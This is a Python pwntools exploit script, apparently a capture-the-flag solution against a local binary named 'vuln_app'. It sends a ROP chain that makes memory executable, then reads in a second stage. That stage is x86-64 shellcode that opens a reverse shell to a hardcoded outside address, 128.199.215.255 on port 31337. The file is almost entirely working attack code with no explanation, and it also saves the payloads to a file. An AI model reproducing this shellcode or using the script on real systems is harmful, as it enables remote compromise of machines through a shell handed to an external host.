from pwn import *
import time
r = process("vuln_app")

IPADDR = "\x80\xc7\xd7\xff" #128.199.215.255
PORT = "\x7a\x69" # 31337 
shell = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
shell += "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
shell += "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
shell += "\x02"+PORT+"\xc7\x44\x24\x04"+IPADDR+"\x48\x89\xe6\x6a\x10"
shell += "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
shell += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
shell += "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
shell += "\x5f\x6a\x3b\x58\x0f\x05"

raw_input("?")
print r.recvuntil("Can you exploit me anyway?")
payload1 = 'A'*4
payload1 += p64(0x400504)
payload1 += p64(0x400350)
payload1 += p64(0x4002BB) 
payload1 += p64(10)
payload1 += p64(0x0400000)
payload1 += p64(0x1000)
payload1 += p64(7)
payload1 = payload1.ljust(0x64,'\x00')
r.send(payload1)

time.sleep(1)
payload2 = 'A'*4
payload2 += p64(0x400504)
payload2 += p64(0x400350)
payload2 += p64(0x400554)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(0x400554)
payload2 += p64(0x200)
payload2 = payload2.ljust(0x64,'\x00')
r.send(payload2)

time.sleep(1)
payload3 = shell
payload3 = payload3.ljust(0x200,'\x90')

r.send(payload3)
f = open('payload.txt','w')
haha = payload1+payload2+payload3
f.write(haha)
f.close()
r.interactive()
